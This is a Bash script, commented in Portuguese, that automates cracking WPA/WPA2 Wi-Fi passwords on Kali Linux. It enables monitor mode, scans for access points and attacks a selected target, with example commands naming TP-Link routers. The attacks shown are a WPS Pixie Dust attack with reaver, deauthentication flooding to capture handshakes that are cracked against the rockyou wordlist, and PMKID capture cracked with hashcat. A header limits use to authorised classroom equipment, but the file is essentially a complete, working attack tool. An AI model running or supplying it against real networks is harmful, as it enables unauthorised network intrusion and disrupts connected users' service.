#!/usr/bin/env bash
#
# wifi_crack.sh - Orquestrador do fluxo de auditoria WPA/WPA2 no Kali Linux.
#
# Automatiza, usando a suite aircrack-ng + hcxtools + hashcat + reaver:
#   1. Coloca a interface em modo monitor
#   2. Escaneia e lista os APs (SSID, BSSID, canal)
#   3. Ataca por um de tres vetores:
#        - wps       : Pixie Dust (reaver/bully + pixiewps) - rapido em TP-Link
#        - handshake : captura handshake WPA2 (deauth opcional) + dicionario
#        - pmkid     : captura PMKID (sem cliente) + dicionario
#   4. Recupera a senha
#
# USO ACADEMICO / AUTORIZADO: so execute contra o equipamento que o professor
# disponibilizou para a atividade. Auditar redes de terceiros sem autorizacao
# e crime (Lei 12.737/2012 - invasao de dispositivo informatico).
#
# Requisitos (Kali):
#   sudo apt update && sudo apt install -y aircrack-ng hcxdumptool hcxtools \
#        hashcat reaver pixiewps
#
set -euo pipefail

# ------------------------------------------------------------------ cores
R="\033[31m"; G="\033[32m"; Y="\033[33m"; B="\033[34m"; N="\033[0m"
info()  { echo -e "${B}[*]${N} $*"; }
ok()    { echo -e "${G}[+]${N} $*"; }
warn()  { echo -e "${Y}[!]${N} $*"; }
erro()  { echo -e "${R}[x]${N} $*" >&2; }

# ------------------------------------------------------------------ defaults
IFACE=""
MODO="handshake"          # wps | handshake | pmkid
BSSID=""
CANAL=""
CLIENTE=""                # MAC de um cliente para deauth direcionado
WORDLIST="/usr/share/wordlists/rockyou.txt"
SAIDA="captura"
DEAUTH=10

uso() {
    cat <<EOF
Uso: sudo $0 -i <interface> [opcoes]

  -i IFACE      interface wireless (ex.: wlan0)            [obrigatorio]
  -m MODO       wps | handshake (padrao) | pmkid
  -b BSSID      MAC do AP alvo (pula o scan interativo)
  -c CANAL      canal do AP alvo
  -t CLIENTE    MAC de cliente para deauth direcionado (modo handshake)
  -w WORDLIST   dicionario (padrao: $WORDLIST)
  -o PREFIXO    prefixo dos arquivos de saida (padrao: $SAIDA)
  -d N          numero de pacotes deauth (padrao: $DEAUTH)
  -h            ajuda

Exemplos (TP-Link AC750 / Archer C20):
  sudo $0 -i wlan0 -m wps                  # tenta Pixie Dust (mais rapido)
  sudo $0 -i wlan0 -m handshake -b AA:BB:CC:DD:EE:FF -c 6
  sudo $0 -i wlan0 -m pmkid                # sem precisar de cliente conectado

Dica: WPS so existe na banda 2.4 GHz (canais 1-13). Use o BSSID de 2.4 GHz.
EOF
    exit "${1:-0}"
}

while getopts "i:m:b:c:t:w:o:d:h" opt; do
    case "$opt" in
        i) IFACE="$OPTARG" ;;
        m) MODO="$OPTARG" ;;
        b) BSSID="$OPTARG" ;;
        c) CANAL="$OPTARG" ;;
        t) CLIENTE="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        o) SAIDA="$OPTARG" ;;
        d) DEAUTH="$OPTARG" ;;
        h) uso 0 ;;
        *) uso 1 ;;
    esac
done

# ------------------------------------------------------------------ checagens
[ "$(id -u)" -eq 0 ] || { erro "Rode como root (sudo)."; exit 1; }
[ -n "$IFACE" ] || { erro "Faltou a interface (-i)."; uso 1; }

for bin in airmon-ng airodump-ng aircrack-ng; do
    command -v "$bin" >/dev/null || { erro "'$bin' nao encontrado. Instale a suite aircrack-ng."; exit 1; }
done

MON=""
cleanup() {
    [ -n "$MON" ] && airmon-ng stop "$MON" >/dev/null 2>&1 || true
    systemctl start NetworkManager >/dev/null 2>&1 || true
    info "Interface restaurada."
}
trap cleanup EXIT INT TERM

# ------------------------------------------------------------------ 1. monitor
info "Liberando a interface e ligando o modo monitor..."
airmon-ng check kill >/dev/null 2>&1 || true
airmon-ng start "$IFACE" >/dev/null
MON=$(iw dev | awk '/Interface/{print $2}' | grep -E "mon|$IFACE" | head -n1)
MON="${MON:-$IFACE}"
ok "Modo monitor ativo em: $MON"

# ------------------------------------------------------------------ 2. scan / alvo
escolher_alvo() {
    if [ -z "$BSSID" ] || [ -z "$CANAL" ]; then
        info "Escaneando redes por 15s..."
        timeout 15 airodump-ng "$MON" --output-format csv -w "${SAIDA}_scan" >/dev/null 2>&1 || true
        if [ -f "${SAIDA}_scan-01.csv" ]; then
            echo; echo "  BSSID               CH  ENC   ESSID"
            echo "  ------------------  --  ----  --------------------"
            awk -F',' 'NF>13 && $1 ~ /:/ {gsub(/^ +| +$/,"",$1);gsub(/^ +| +$/,"",$4);gsub(/^ +| +$/,"",$6);gsub(/^ +| +$/,"",$14); printf "  %-18s  %-2s  %-4s  %s\n",$1,$4,$6,$14}' "${SAIDA}_scan-01.csv" || true
            echo
        fi
        read -rp "BSSID do alvo : " BSSID
        read -rp "Canal do alvo : " CANAL
    fi
    [ -n "$BSSID" ] && [ -n "$CANAL" ] || { erro "BSSID/canal nao definidos."; exit 1; }
    info "Alvo: BSSID=$BSSID  canal=$CANAL  modo=$MODO"
}

# ------------------------------------------------------------------ 3. ataques
ataque_wps() {
    for bin in reaver pixiewps wash; do
        command -v "$bin" >/dev/null || { erro "'$bin' nao instalado (sudo apt install -y reaver pixiewps)."; exit 1; }
    done
    if [ "$CANAL" -gt 14 ] 2>/dev/null; then
        warn "Canal $CANAL e 5 GHz; WPS so existe em 2.4 GHz. Use o BSSID de 2.4 GHz."
    fi
    info "Verificando APs com WPS ativo (wash)..."
    timeout 15 wash -i "$MON" 2>/dev/null | head -n 20 || true
    echo
    info "Iniciando ataque Pixie Dust (reaver -K 1). Pode levar de segundos a minutos..."
    reaver -i "$MON" -b "$BSSID" -c "$CANAL" -K 1 -N -vv || true
    echo
    info "Se o Pixie Dust falhar, tente o PIN por bruteforce (mais lento):"
    echo "    sudo reaver -i $MON -b $BSSID -c $CANAL -vv"
    echo "  ou, com o PIN em maos, recupere a senha:"
    echo "    sudo reaver -i $MON -b $BSSID -c $CANAL -p <PIN>"
}

ataque_handshake() {
    HASH="${SAIDA}.hc22000"
    info "Capturando handshake. Deixe esta captura rodando..."
    timeout 40 airodump-ng --bssid "$BSSID" -c "$CANAL" -w "$SAIDA" "$MON" >/dev/null 2>&1 &
    CAP_PID=$!
    sleep 5
    info "Enviando ${DEAUTH} pacotes deauth para forcar o handshake..."
    if [ -n "$CLIENTE" ]; then
        aireplay-ng --deauth "$DEAUTH" -a "$BSSID" -c "$CLIENTE" "$MON" >/dev/null 2>&1 || true
    else
        aireplay-ng --deauth "$DEAUTH" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
    fi
    wait "$CAP_PID" 2>/dev/null || true
    CAP="${SAIDA}-01.cap"
    [ -f "$CAP" ] || { erro "Arquivo de captura $CAP nao gerado."; exit 1; }
    if aircrack-ng "$CAP" 2>/dev/null | grep -q "1 handshake"; then
        ok "Handshake capturado em $CAP"
    else
        warn "Handshake pode nao ter sido capturado. Rode de novo com um cliente ativo (-t)."
    fi
    [ -f "$WORDLIST" ] || { erro "Wordlist '$WORDLIST' nao existe. Descompacte: sudo gunzip ${WORDLIST}.gz"; exit 1; }
    info "Quebrando por dicionario com aircrack-ng..."
    aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP" || true
}

ataque_pmkid() {
    for bin in hcxdumptool hcxpcapngtool hashcat; do
        command -v "$bin" >/dev/null || { erro "'$bin' nao instalado (sudo apt install -y hcxdumptool hcxtools hashcat)."; exit 1; }
    done
    HASH="${SAIDA}.hc22000"
    info "Capturando PMKID por 30s (nao precisa de cliente conectado)..."
    timeout 30 hcxdumptool -i "$MON" -w "${SAIDA}.pcapng" --enable_status=1 >/dev/null 2>&1 || true
    hcxpcapngtool -o "$HASH" "${SAIDA}.pcapng" >/dev/null 2>&1 || true
    [ -s "$HASH" ] || { erro "Nenhum PMKID capturado. Tente o modo handshake."; exit 1; }
    ok "PMKID capturado em $HASH"
    [ -f "$WORDLIST" ] || { erro "Wordlist '$WORDLIST' nao existe. Descompacte: sudo gunzip ${WORDLIST}.gz"; exit 1; }
    info "Quebrando por dicionario com hashcat (-m 22000)..."
    hashcat -m 22000 "$HASH" "$WORDLIST" || true
    echo; info "Senha encontrada (se houver):"
    hashcat -m 22000 "$HASH" --show || true
}

case "$MODO" in
    wps)       escolher_alvo; ataque_wps ;;
    handshake) escolher_alvo; ataque_handshake ;;
    pmkid)     escolher_alvo; ataque_pmkid ;;
    *) erro "Modo invalido: '$MODO' (use wps | handshake | pmkid)."; exit 1 ;;
esac

ok "Fluxo concluido. Arquivos com prefixo '${SAIDA}' ficaram no diretorio atual."
